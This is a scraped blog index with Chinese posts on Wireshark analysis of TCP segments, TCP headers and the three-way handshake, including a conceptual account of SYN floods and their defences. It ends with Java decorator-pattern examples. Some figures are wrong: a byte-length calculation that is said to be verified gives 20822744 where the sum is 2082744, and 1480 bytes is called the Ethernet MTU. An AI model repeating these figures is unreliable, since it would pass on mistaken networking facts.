分析从宏观的层面来看，无非是浏览器进程发送一个GET请求，以获得 /logo.jpg资源，Web服务器返回一个图片资源。 从微观层面来看，这个图片文件较大，因此这个HTTP Response，其实是被分割了若干个TCP segment（分别对应若干次TCP传输）进行传输的，当所有的这些TCP segment都达到操作系统内核后，由内核负责拼接这个TCP segment，最终获得了一个完整的HTTP Response。 我们先看看看这个HTTP Reponse的Header，它的长度为587 bytes： 123456789101112131415161718192021HTTP/1.1 200 OKServer: GitHub.comContent-Type: image/jpegLast-Modified: Thu, 02 May 2019 03:12:12 GMTETag: &quot;5cca600c-2bc4&quot;Access-Control-Allow-Origin: *Expires: Thu, 02 May 2019 03:48:13 GMTCache-Control: max-age=600X-GitHub-Request-Id: 2C04:4A4E:158055:1744D4:5CCA6624Content-Length: 11204Accept-Ranges: bytesDate: Thu, 02 May 2019 04:23:26 GMTVia: 1.1 varnishAge: 0Connection: keep-aliveX-Served-By: cache-tyo19946-TYOX-Cache: HITX-Cache-Hits: 1X-Timer: S1556771006.045095,VS0,VE94Vary: Accept-EncodingX-Fastly-Request-ID: 4f43f0d925d973c8a6304ea8011d62a1590057bc 通过Content-Length域，我们知道了这个图片文件的大小为11204 bytes。 在Wireshark中，标示出了这个HTTP Response其实是通过装配包号为284、285、287、288、291、292、294、295和296这9个TCP包中的Body获得的。 我们尝试验证一下，这九个TCP包的Body长度分别为1388、1388、1388、1388、1388、1388、1388、1388 和 709 bytes，加起来总共是11813 bytes。 前面提到，HTTP Reponse的Header的长度为587 bytes，图片文件的大小为11204 bytes。因此加起来587 + 11204 = 11791 bytes。按理说，将这九个TCP包的Body拼接起来后的长度应该等于HTTP Reponse的Header的长度加上图片文件的大小。 这里暂时存疑。 TCP传输中的Sequence Number设置问题我们再来看看，如果与统一主机连续请求两个HTTP，这两个HTTP的Reponse对应的第一个TCP包的Sequence Number是如何设置的。 这里有四个HTTP包，分别是两对HTTP通信。 通过增加tcp &amp;&amp; ip.addr == 158.199.142.239过滤条件，我们摘取出以下关键TCP包。 #300（TCP，HTTP，第一个HTTP Request）Sequence number = 1 Acknowledge number = 302 #313（TCP，为第一个HTTP传输数据的第一个TCP）Sequence number = 1 Acknowledge number = 302 … #340（TCP，HTTP，第一个HTTP Response）Sequence number = 21858 ​ [TCP Segment Len: 1203] ​ [Next sequence number: 23061 (relative sequence number)] ​ 17 Reassembled TCP Segments (#313, #314, #315, #316, #317 #318, #319, #320, #327, #328, #329, #330, #334, #335, #336, #339, #340) Acknowledge number = 302 说明 对于#340，根据Sequence number = 21858和TCP Segment Len: 1203，因此，这次HTTP最后一个字节在整个流中的序号应该为21858 + 1203 - 1 = 23060；而这个HTTP Reponse第一个字节在整个流中的序号应该为1。因此，这个HTTP Reponse的长度为23060 - 1 + 1 = 23060。 在Wireshark中，可以查到这个HTTP Response 长度为23060 bytes，我们的计算得到验证。 这也说明，在这个HTTP的Response的所有TCP片段（segment）被全部传输到Client之前，该Server与该Client没有进行任何其他的包含真实传输内容的TCP通信（包含真实传输内容的TCP通信是指TCP Body的长度不为0的TCP通信，比如 [TCP Window Update]就不属于包含真实传输内容的TCP通信）。 #342（TCP，HTTP，第二个HTTP Request）Sequence number = 302 Acknowledge number = 23061 #351（TCP，为第一个HTTP传输数据的第一个TCP）Sequence number = 23061 Acknowledge number = 555 … #2956（TCP，HTTP，第二个HTTP Response）Sequence number = 2105274 ​ [TCP Segment Len: 531] ​ [Next sequence number: 2105805 (relative sequence number)] Acknowledge number = 555 说明 对于#2956，根据Sequence number = 2105274 和TCP Segment Len: 531，因此，这个HTTP Reponse最后一个字节在整个流中的序号应该为 2105274 + 531 - 1 = 2105804；而这个HTTP Reponse第一个字节在整个流中的序号应该为23061。因此，这个HTTP Reponse的长度为 2105804 - 23061 + 1 = 20822744。 在Wireshark中，可以查到这个HTTP Response 长度为20822744 bytes，我们的计算得到验证。 这同时也说明了，在这个HTTP的Response的所有TCP片段（segment）被全部传输到Client之前，该Server与该Client没有进行任何其他的包含真实传输内容的TCP通信。 注通过Wireshake抓取的交互过程包可以通过[https://github.com/swsmile/TCP-Learning/blob/master/TCP%20Connection%20Learning.pcapng.gz](https://github.com/swsmile/TCP-Learning/blob/master/TCP Connection Learning.pcapng.gz)下载。","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP（Transmission Control Protocol）","date":"2019-05-03T05:44:36.000Z","path":"2019/05/03/【Network】TCP/","text":"TCP（Transmission Control Protocol）TCP（Transmission Control Protocol）提供一种面向连接的、可靠的字节流服务。TCP连接是全双工的，即数据在两个方向上能够同时传递。 TCP和UDP处在同一层（传输层），但是TCP和UDP最不同的地方是，TCP提供了一种可靠（reliable）的数据传输服务，TCP是面向连接的。 也就是说，利用TCP通信的两台主机首先要经历一个“拨打电话”的过程，等到通信准备结束才开始传输数据，最后结束通话。所以TCP要比UDP可靠的多，UDP是把数据直接发出去，而不管对方是不是在收信，就算是UDP无法送达，也不会产生ICMP差错报文。 IP包裹的TCPTCP报文由首部和数据组成，数据部分是可选的。TCP报文被封装在IP数据报中，结构如下图所示： TCP 头部（TCP Header）结构TCP Header由固定部分（Basic）和选项部分（Options）组成，其中固定部分的大小为20 bytes。TCP Header最长为60 bytes。 因此，默认的TCP头部（TCP Header）长度为20个字节。 下面就将每个字段的信息都详细的说明一下。 Source Port （源端口号）和Destination Port（目的端口号）：分别占用16位；用于区别主机中的不同进程，而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一的确定一个TCP连接。 Sequence Number（请求序号）：占用32位，用来标识从TCP发端向TCP收端发送的数据字节流，它表示当前TCP报文段中的第一个数据字节在数据流中的序号；主要用来解决网络报乱序（reordering）的问题。 当建立一个新的连接时，请求序号等于含由这个主机选择的该连接的初始序号ISN（Initial Sequence Number）。 Acknowledgment Number（确认序号）：占用32位，确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志（下面介绍）为1时该确认序列号的字段才有效。主要用来解决不丢包的问题。 Header Length（TCP Header长度）：占用4位，表示TCP Header的长度为多少个32bit（4字节），或者说，表示TCP 数据区的起始位置距离TCP Header的起始位置有多少个32bit。 需要这个字段的原因是因为TCP Header中Options（可选字段）区域的长度是可变的； 该字段的最大值为15（即0xf）；这意味着TCP Header的最大长度为4字节*15=60字节； 当TCP Header中没有Options区域时，TCP Header的长度是20字节。因此，TCP Header的默认长度就是20字节； TCP Flags（TCP 标志位）：TCP Header中有12个标志位，每个标志位占用一个bit。 它们中的多个可同时被设置为1； 前六位为保留位（Resserved），后六位分别为Urgent、Acknowledgment、Push、Reset、Syn和Fin； 有的资料也认为保留位只包括前四位（或者前三位），而（Nonce）、Congestion Window Reduced (CWR)、ECN-Echo（ECU）不是保留位。 用于操控TCP的状态机的标志位，包括URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下： URG：此标志表示TCP包的紧急指针（Urgent Pointer）域有效，用来保证TCP连接不被中断，并且督促中间层设备要尽快处理这些数据； ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中；有两个取值：0和1，为1的时候表示应答域有效，反之为0； PSH：表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序，而不是在缓冲区中排队； RST：表示连接复位（Reset）请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包； SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1，ACK=0；连接被响应的时候，SYN=1，ACK=1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口；但是由于这种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全的主机将会强制要求一个连接严格的进行TCP的三次握手； FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。 Window size（窗口大小）：占用16位，单位为字节，也就是有名的滑动窗口（Sliding Window），用来进行流量控制；具体来说，用来控制对方发送的数据量，单位为字节。TCP连接中的一端根据自己的缓存空间大小来具体确定接收窗口大小，并通知对方。 Window size value可能由Window size（窗口大小）和 Window size scaling factor（窗口大小换算系数）共同决定。 Checksum（校验和）：占用16位，用于校验Header和数据区这两部分的数据抵达接收方主机后的完整性。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。 Urgent pointer（紧急指针）：占用16位，紧急指针指出在本报文段中的紧急数据的最后一个字节的序号。 Options（可选区域）：占用0到20个字节，具体可能包括以下几个字段：maximum segment，windows scale，NOP，SACK permitted等。 Options（可选区域）每一个Option项均为这样的结构：Kind + （Length） + （Data）： Kind部分：必须，表示这个Option项的类型，占8 Bit： Kind=0表示选项结束（End of Option List，EOL），整个Option项占用一个1字节； Kind=1表示无操作（No-Operation，NOP），主要是用来占位从而达到字节对齐的目的，整个Option项占用一个1字节； Kind=2表示MSS（Maximum Segment Size，最大分段大小），表示对方通过TCP传输到本机的最大TCP segment数据的长度。当建立一个连接时，每方都可以通告对方，自己期望接收的 MSS选项（M S S选项只能出现在SYN报文段中），整个Option项占用一个4字节； 通过MSS，应用数据被分割成TCP认为最适合发送的数据块； 我们不难联想到，跟最大报文段长度最为相关的一个参数是网络设备接口的MTU，以太网的MTU是1500，基本IP首部长度为20，TCP首部是20，所以MSS的值可达1460（MSS不包括协议首部，只包含应用数据） Kind=3表示窗口扩大因子（window scale），整个Option项占用一个3字节； Kind=4表示SACK-Permitted，整个Option项占用一个2字节； Kind=5表示一个SACK包，整个Option项长度可变； Kind=8表示时间戳（Timestamps），整个Option项占用一个10字节。 时间戳选项使发送方在每个报文段中放置一个时间戳值。接收方在确认中返回这个数值，从而允许发送方为每一个收到的 ACK计算RTT。 Length部分：可选，表示Kind、Lenght、Data三者的总长度，占8 Bit； 当Kind = 1时，没有Length部分。 Data部分，可选，表示内容 举例： 类型2，表示MSS（Maximum Segment Size），长度length = 4 Bytes, Data(MSS Value = 1440) 1234TCP Option - Maximum segment size: 1460 bytes Kind: Maximum Segment Size (2) Length: 4 MSS Value: 1460 类型1，表示无操作（No-Operation） 12TCP Option - No-Operation (NOP) Kind: No-Operation (1) 类型3，表示窗口扩大因子（window scale）为2，长度为3 12345TCP Option - Window scale: 6 (multiply by 64) Kind: Window Scale (3) Length: 3 Shift count: 6 [Multiplier: 64] 类型8，时间戳（Timestamps）12345TCP Option - Timestamps: TSval 617957676, TSecr 0 Kind: Time Stamp Option (8) Length: 10 Timestamp value: 617957676 Timestamp echo reply: 0 类型4，表示SACK-Permitted，长度为2 123TCP Option - SACK permitted Kind: SACK Permitted (4) Length: 2 类型0，表示选项结束（End of Option List，EOL） 12TCP Option - End of Option List (EOL) Kind: End of Option List (0) TCP连接的建立与终止 TCP是一个面向连接的协议，在发送输送之前 ，双方需要确定连接。而且，发送的数据可以进行TCP层的分片处理。 TCP连接的建立过程 ，可以看成是三次握手 。而连接的中断可以看成四次握手 。 1 连接的建立在建立连接的时候，客户端首先向服务器申请打开某一个端口（用SYN段等于1的TCP报文），然后服务器端发回一个ACK报文通知客户端请求报文收到，客户端收到确认报文以后，再次发出确认报文确认刚才服务器端发出的确认报文，至此，连接的建立完成。这就叫做三次握手。 如果打算让双方都做好准备的话，一定要发送三次报文，而且只需要三次报文就可以了。 可以想见，如果再加上TCP的超时重传机制，那么TCP就完全可以保证一个数据包被送到目的地。 2 结束连接TCP有一个特别的概念叫做half-close，这个概念是说，TCP的连接是全双工（可以同时发送和接收）连接，因此在关闭连接的时候，必须关闭传和送两个方向上的连接。客户机给服务器一个FIN为1的TCP报文，然后服务器返回给客户端一个确认ACK报文，并且再发送一个FIN报文，当客户机回复ACK报文后（四次握手），连接就结束了。 TCP数据包的发送过程可以想象一个TCP数据的发送应该是如下的一个过程： 双方建立连接； 发送方给接受方TCP数据报，然后等待数据接受方的确认TCP数据报，如果在超时后仍然没有收到确认，就重新发，如果有，就发送下一个数据报； 接受方等待发送方的数据报，如果得到数据报并检验无误，就发送ACK（确认）数据报，并等待下一个TCP数据报的到来。直到接收到FIN（发送完成数据报）； 中止连接。 以下为动画演示数据包发送的交互过程： ![102510znki8k85ilu2q8ks (assets/102510znki8k85ilu2q8ks (1)-7301826.gif)](assets/102510znki8k85ilu2q8ks (1).gif) TCP保证可靠性把TCP保证可靠性的简单工作原理： 应用数据被分割成TCP认为最适合发送的数据块。这和UDP完全不同，应用程序产生的数据报长度将保持不变。由TCP传递给IP的信息单位称为报文段或段（Segment）。 当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。 当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒. TCP将计算它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错， TCP将丢弃这个报文段和不确认收到此报文段（希望发端超时并重发）。 既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此，TCP报文段的到达也可能会失序。如果必要， TCP将对收到的数据进行重新排序，将收到的数据以正确的顺序交给应用层。 TCP还能提供流量控制。TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出。 从这段话中可以看到，TCP中保持可靠性的方式就是超时重发，这是有道理的，虽然TCP也可以用各种各样的ICMP报文来处理这些，但是这也不是可靠的，最可靠的方式就是只要不得到确认，就重新发送数据报（datagram），直到得到对方的确认为止。 TCP的首部和UDP首部一样，都有发送端口号和接收端口号。但是显然，TCP的首部信息要比UDP的多，可以看到，TCP协议提供了发送和确认所需要的所有必要的信息。 TCP的状态机TCP状态转换图，可以很好地概括整个TCP连接的建立和终止的过程及状态的变化。图来自 TCP/IP Illustrated, Volume 1 : The Protocols(2nd Edition) 。 TCP KeepAliveTCP 的连接，实际上是一种纯软件层面的概念，在物理层面并没有“连接”这种概念。TCP 通信双方建立交互的连接，但是并不是一直存在数据交互，有些连接会在数据交互完毕后，主动释放连接，而有些不会。在长时间无数据交互的时间段内，交互双方都有可能出现掉电、死机、异常重启等各种意外，当这些意外发生之后，这些 TCP 连接并未来得及正常释放，在软件层面上，连接的另一方并不知道对端的情况，它会一直维护这个连接，长时间的积累会导致非常多的半打开连接，造成端系统资源的消耗和浪费，为了解决这个问题，在传输层可以利用 TCP 的 KeepAlive 机制实现来实现。主流的操作系统基本都在内核里支持了这个特性。 TCP KeepAlive 的基本原理是，隔一段时间给连接对端发送一个探测包，如果收到对方回应的 ACK，则认为连接还是存活的，在超过一定重试次数之后还是没有收到对方的回应，则丢弃该 TCP 连接。 TCP KeepAlive 的局限首先 TCP KeepAlive 监测的方式是发送一个 probe 包，会给网络带来额外的流量，另外 TCP KeepAlive 只能在内核层级监测连接的存活与否，而连接的存活不一定代表服务的可用。例如当一个服务器 CPU 进程服务器占用达到 100%，已经卡死不能响应请求了，此时 TCP KeepAlive 依然会认为连接是存活的。因此 TCP KeepAlive 对于应用层程序的价值是相对较小的。需要做连接保活的应用层程序，例如 QQ，往往会在应用层实现自己的心跳功能。 TCP的拥塞控制TCP的异常终止TCP的异常终止是相对于正常释放TCP连接的过程而言的。 我们都知道，TCP连接的建立是通过三次握手完成的，而TCP正常释放连接是通过四次挥手来完成，但是有些情况下，TCP在交互的过程中会出现一些意想不到的情况，导致TCP无法按照正常的四次挥手来释放连接，如果此时不通过其他的方式来释放TCP连接的话，这个TCP连接将会一直存在，占用系统的部分资源。 在这种情况下，我们就需要有一种能够释放TCP连接的机制，这种机制就是TCP的reset报文。reset报文是指TCP报头的标志字段中的reset位置一的报文，如下图所示： TCP异常终止的常见情形我们在实际的工作环境中，导致某一方发送reset报文的情形主要有以下几种： 1.客户端尝试与服务器未对外提供服务的端口建立TCP连接，服务器将会直接向客户端发送reset报文 客户端和服务器的某一方在交互的过程中发生异常（如程序崩溃等），该方系统将向对端发送TCP reset报文，告之对方释放相关的TCP连接，如下图所示： 接收端收到TCP报文，但是发现该TCP的报文，并不在其已建立的TCP连接列表内，则其直接向对端发送reset报文，如下图所示： 在交互的双方中的某一方长期未收到来自对方的确认报文，则其在超出一定的重传次数或时间后，会主动向对端发送reset报文释放该TCP连接，如下图所示： 5，有些应用开发者在设计应用系统时，会利用reset报文快速释放已经完成数据交互的TCP连接，以提高业务交互的效率，如下图所示： TCP初始化序列号ISNTCP初始化序列号不能设置为一个固定值，因为这样容易被攻击者猜出后续序列号，从而遭到攻击 RFC1948中提出了一个较好的初始化序列号ISN随机生成算法 ISN = M + F(localhost, localport, remotehost, remoteport) M是一个计时器，这个计时器每隔4毫秒加1 F是一个Hash算法，根据源IP、目的IP、源端口、目的端口生成一个随机数值。 TCP分段与IP分片的区别IP分片产生的原因是MTU网络层的；而TCP分段产生原因是MSS（Max Segment Size），它们工作在不同的层。 IP分片由网络层完成，也在网络层进行重组；TCP分段是在传输层完成，并在传输层进行重组。 对于以太网，MSS为1460字节（1500 – 20 - 20），而MTU为1480字节（1500 – 20 ）其中20字节为IP的头部。因而，MTU往往会大于MSS。 因此，采用TCP协议进行数据传输，是不会造成IP分片的。因为当数据过大时，会在传输层进行数据分段，因而到了IP层就不用分片了。 我们常提到的IP分片是由于UDP传输协议造成的，因为UDP传输协议并未限定传输UDP Datagram（数据报）的大小。 Wireshark常见异常状态 TCP Previous segment not captured TCP前分片未收到 TCP Out-Of-Order TCP数据乱序 TCP Dup ACK 47#1 重复应答 当收到一个出问题的分片，TCP协议规定接收方应立即产生一个应答。这个相同的ack不会延迟。这个相同应答的意图是让对端知道一个分片被收到的时候出现问题，并且告诉它希望得到的序列号。上图中TCP Dup ACK 47#1 的意思第47位数据出现问题，次数是1次。 最大报文长度（Maximum Segment Size）最大报文段长度（Maximum Segment Size）表示TCP传往另一端的最大块数据的长度。当一个连接建立时，连接的双方都要通告各自的MSS。 一般这个SYN长度是MTU减去固定IP首部和TCP首部长度。 对于一个以太网，一般可以达到1460字节。当然如果对于非本地的IP，这个MSS可能就只有536字节，而且，如果中间的传输网络的MSS更加的小的话，这个值还会变得更小。 TCP的半关闭TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。这就是所谓的半关闭。正如我们早些时候提到的只有很少的应用程序使用它。 为了使用这个特性，编程接口必须为应用程序提供一种方式来说明“我已经完成了数据传送，因此发送一个文件结束（FIN）给另一端，但我还想接收另一端发来的数据，直到它给我发来文件结束（FIN）”。 复位报文段我们已经介绍了TCP首部中的RST比特是用于“复位”的。一般说来，无论何时一个报文段发往基准的连接（referenced connection）出现错误，TCP都会发出一个复位报文段（这里提到的“基准的连接”是指由目的IP地址和目的端口号以及源IP地址和源端口号指明的连接。这就是为什么RFC 793称之为插口）。 到不存在的端口的连接请求产生复位的一种常见情况是当连接请求到达时，目的端口没有进程正在听。对于UDP，当一个数据报到达目的端口时，该端口没在使用，它将产生一个ICMP端口不可达的信息。而TCP则使用复位。 异常终止一个连接终止一个连接的正常方式是一方发送FIN，这也称为有序释放（orderly release），因为在所有排队数据都已发送之后才发送FIN，正常情况下没有任何数据丢失。 但也有可能发送一个复位报文段而不是FIN来中途释放一个连接。有时称这为异常释放（abortive release）。 异常终止一个连接对应用程序来说有两个优点： 丢弃任何待发数据并立即发送复位报文段； RST的接收方会区分另一端执行的是异常关闭还是正常关闭。应用程序使用的API必须提供产生异常关闭而不是正常关闭的手段。 Reference TCP/IP Illustrated, Volume 1 : The Protocols(2nd Edition), Kevin.R.Fall TCP 连接的建立和终止 - https://www.sczyh30.com/posts/Network/tcp-connection/ Wireshark 数据分析（三） - https://blog.csdn.net/u011414200/article/details/47948401 脑残式网络编程入门(一)：跟着动画来学TCP三次握手和四次挥手 -http://www.52im.net/thread-1729-1-1.html [通俗易懂]深入理解TCP协议（上）：理论基础 - http://www.52im.net/thread-513-1-1.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP 三次握手（TCP Three-way Handshake）","date":"2019-05-03T02:40:44.000Z","path":"2019/05/03/【Network】TCP-三次握手/","text":"TCP 三次握手（TCP Three-way Handshake）TCP是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP/IP协议中，TCP协议提供可靠的连接服务，连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。 ![TCP Three-way Handshake](assets/TCP Three-way Handshake.png) 第一次握手 - 建立连接客户端发送连接请求报文段，将Control Flag中的SYN位置为1，Sequence Number（发送序号）为x；然后，客户端进入SYN_SEND状态，等待服务器的确认。这个客户端发送连接请求报文段，是一个SYN报文段。 SYN报文段是指，Control Flag中的SYN位为1的TCP报文段。 第二次握手 - 服务器收到SYN报文段服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number（确认序号）为x+1（即Sequence Number+1）；同时，自己还要发送SYN请求信息（即将SYN位置为1），Sequence Number（发送序号）为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态。 类似地，ACK报文段是指Control Flag中的ACK位为1的TCP报文段。而SYN+ACK报文段是指Control Flag中的SYN位和ACK位均为1的TCP报文段。 第三次握手 - 客户端收到服务器的SYN+ACK报文段客户端收到服务器发送的SYN+ACK报文段后，将Acknowledgment Number（确认序号）设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端进入ESTABLISHED状态。当服务器端接收到这个ACK报文段后，服务器端进入ESTABLISHED状态，完成TCP三次握手。 而如果，客户端向服务器发送ACK报文段没有达到服务器端（或者延迟了），服务器会重新发送一个第二次握手阶段中的SYN+ACK报文段。 以下为动画演示三次握手的交互过程： SYN攻击在三次握手过程中，Server发送SYN+ACK之后，收到Client的ACK之前的TCP连接称为半连接（half-open connect），此时Server处于SYN_RCVD状态，当收到ACK后，Server转入ESTABLISHED状态。 SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server回复确认包，并等待Client的确认，由于源地址是不存在的，因此，Server需要不断重发直至超时，这些伪造的SYN包将产时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络堵塞甚至系统瘫痪。 SYN攻击时一种典型的DDOS攻击，检测SYN攻击的方式非常简单，即当Server上有大量半连接状态且源IP地址是随机的，则可以断定遭到SYN攻击了，使用如下命令可以让之现行： 1netstat -nap | grep SYN_RECV 如何防御 SYN 攻击？SYN攻击不能完全被阻止，除非将TCP协议重新设计。我们所做的是尽可能的减轻SYN攻击的危害，常见的防御 SYN 攻击的方法有如下几种： 缩短超时（SYN Timeout）时间 增加最大半连接数 过滤网关防护 SYN cookies技术 三次握手时可能发生的丢包问题TCP规定：对有数据的TCP segment 在接收方收到数据后，必须向发送方发送一个ACK数据包以表示确认。 以主机A尝试与B进行连接为例，我们来分别讨论一下，在进行三次握手时，不同握手阶段的握手数据包丢失时的情况。 第一次握手时丢包第一个包，即A发给B的SYN 数据报丢包了，没有到达B。此后，A会周期性超时重传，直到收到B的确认（ACK+SYN数据报）。 第二次握手时丢包第二个包，即B发给A的SYN +ACK 数据报丢包了，没有到达A。此后，B会周期性超时重传，直到收到A的确认（ACK数据报）。 这就需要一个超时时间让B将这个连接断开，否则这个连接就会一直占用A的SYN连接队列中的一个位置，大量这样的连接就会将B的SYN连接队列耗尽，让正常的连接无法得到处理。 目前，Linux下默认会进行5次重发SYN-ACK包，重试的间隔时间从1s开始，下次的重试间隔时间是前一次的双倍，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s都知道第5次也超时了.所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s = 63s，TCP才会把断开这个连接。 由于，SYN超时需要63秒，那么就给攻击者一个攻击服务器的机会，攻击者在短时间内发送大量的SYN包给Server(俗称 SYN flood 攻击)，用于耗尽Server的SYN队列。对于应对SYN 过多的问题，linux提供了几个TCP参数：tcp_syncookies、tcp_synack_retries、tcp_max_syn_backlog、tcp_abort_on_overflow 来调整应对。 第三次握手时丢包第三个包，即A发给B的ACK 数据报丢包了，没有到达B。 A发完ACK，单方面认为TCP为 Established状态，而B显然认为TCP为Active状态。 因此，具体存在以下三种情况： a. 假定在此后一段时间双方都没有数据发送，B会周期性超时重传，直到收到A的确认。且收到之后，B的TCP 连接也为 Established状态，因而可以双向发包。 b. 假定此时A有数据发送，B收到A的 Data + ACK后，自然会切换为Established 状态，并接受A的Data。 c. 假定B有数据发送，但是因为数据发送不了（由于B未接收到A发来的ACK数据报），因此会一直会周期性超时重传SYN + ACK，直到收到A的确认后，才可以发送数据。 Reference 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab 通俗大白话来理解TCP协议的三次握手和四次分手 - https://github.com/jawil/blog/issues/14 TCP 为什么是三次握手，而不是两次或四次？ - https://www.zhihu.com/question/24853633 脑残式网络编程入门(一)：跟着动画来学TCP三次握手和四次挥手 -http://www.52im.net/thread-1729-1-1.html 不为人知的网络编程(一)：浅析TCP协议中的疑难杂症(上篇) - http://www.52im.net/thread-1003-1-1.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Design Pattern】结构类模式 — 装饰器模式（Decorator Pattern）","date":"2019-04-09T13:27:16.000Z","path":"2019/04/09/【Design-Pattern】结构类模式-装饰器模式-Decorator-Pattern/","text":"定义装饰器模式以对客户端透明的方式，给一个对象附加上更多的责任（以实现对对象功能的扩展）。 换言之，客户端并不会觉得对象在装饰前和装饰后有什么不同。装饰器模式可以在不需要创造更多子类的情况下，将对象的功能加以扩展。这就是装饰器模式的模式动机。 角色 Component：接口，定义一个抽象接口，真实对象和装饰对象具有相同的接口，以便动态的添加职责。 ConcreteComponent：具体的组件。 Decorator：装饰器类，继承了Component接口，目的是扩展Component类的功能，并且持有一个构建引用，进行请求转发。 ConcreteDecorator：具体装饰器类，用于给实际对象添加职责。 组件接口（Component）角色123public interface Component &#123; public void sampleOperation();&#125; 具体组件（Concrete Component）角色123456public class ConcreteComponent implements Component &#123; @Override public void sampleOperation() &#123; // 写相关的业务代码 &#125;&#125; 装饰器（Decorator）角色1234567891011121314public abstract class Decorator implements Component&#123; private Component component; public Decorator(Component component)&#123; this.component = component; &#125; @Override public void sampleOperation() &#123; // 委派给组件 component.sampleOperation(); &#125; &#125; 具体装饰器（Concrete DecoratorA）角色123456789101112public class ConcreteDecoratorA extends Decorator &#123; public ConcreteDecoratorA(Component component) &#123; super(component); &#125; @Override public void sampleOperation() &#123; super.sampleOperation(); // 写相关的业务代码 &#125;&#125; 具体装饰器（Concrete DecoratorB）角色123456789101112public class ConcreteDecoratorB extends Decorator &#123; public ConcreteDecoratorB(Component component) &#123; super(component); &#125; @Override public void sampleOperation() &#123; super.sampleOperation(); // 写相关的业务代码 &#125;&#125; 例子现在考虑这样一个场景，现在有一个煎饼摊，人们去买煎饼（Pancake）,有些人要加火腿（Ham）的，有些人要加鸡蛋（Egg）的，有些人要加生菜（Lettuce）的，当然土豪可能有啥全给加上^_^。用上述的装饰器模式来进行编码。 1 定义煎饼接口IPancake123456789/** * 定义一个煎饼接口 */public interface IPancake &#123; /** * 定义烹饪的操作 */ void cook();&#125; 2 定义具体的煎饼Pancake12345678/** * 具体的煎饼对象，可用其他装饰类进行动态扩展。 */public class Pancake implements IPancake&#123; public void cook() &#123; System.out.println(\"的煎饼\"); &#125;&#125; 3 定义抽象装饰类PancakeDecorator123456789101112131415161718/** * 实现接口的抽象装饰类，建议设置成abstract. */public abstract class PancakeDecorator implements IPancake &#123; /***/ private IPancake pancake; public PancakeDecorator(IPancake pancake) &#123; this.pancake = pancake; &#125; public void cook() &#123; if (this.pancake != null) &#123; pancake.cook(); &#125; &#125;&#125; 4 具体装饰类EggDecorator123456789101112131415161718/** * 对煎饼加鸡蛋的装饰类，继承PancakeDecorator，覆盖cook操作 */public class EggDecorator extends PancakeDecorator &#123; public EggDecorator(IPancake pancake) &#123; super(pancake); &#125; /** * 覆盖cook方法，加入自身的实现，并且调用父类的cook方法，也就是构造函数中 * EggDecorator(IPancake pancake)，这里传入的pancake的cook操作 */ @Override public void cook() &#123; System.out.println(\"加了一个鸡蛋，\"); super.cook(); &#125;&#125; 5 具体装饰类HamDecorator123456789101112131415161718/** * 对煎饼加火腿的装饰类，继承PancakeDecorator，覆盖cook操作 */public class HamDecorator extends PancakeDecorator &#123; public HamDecorator(IPancake pancake) &#123; super(pancake); &#125; /** * 覆盖cook方法，加入自身的实现，并且调用父类的cook方法，也就是构造函数中 * EggDecorator(IPancake pancake)，这里传入的pancake的cook操作 */ @Override public void cook() &#123; System.out.println(\"加了一根火腿，\"); super.cook(); &#125;&#125; 6 具体装饰类LettuceDecorator123456789101112131415161718/** * 对煎饼加生菜的装饰类，继承PancakeDecorator，覆盖cook操作 */public class LettuceDecorator extends PancakeDecorator &#123; public LettuceDecorator(IPancake pancake) &#123; super(pancake); &#125; /** * 覆盖cook方法，加入自身的实现，并且调用父类的cook方法，也就是构造函数中 * EggDecorator(IPancake pancake)，这里传入的pancake的cook操作 */ @Override public void cook() &#123; System.out.println(\"加了一颗生菜，\"); super.cook(); &#125;&#125; 7 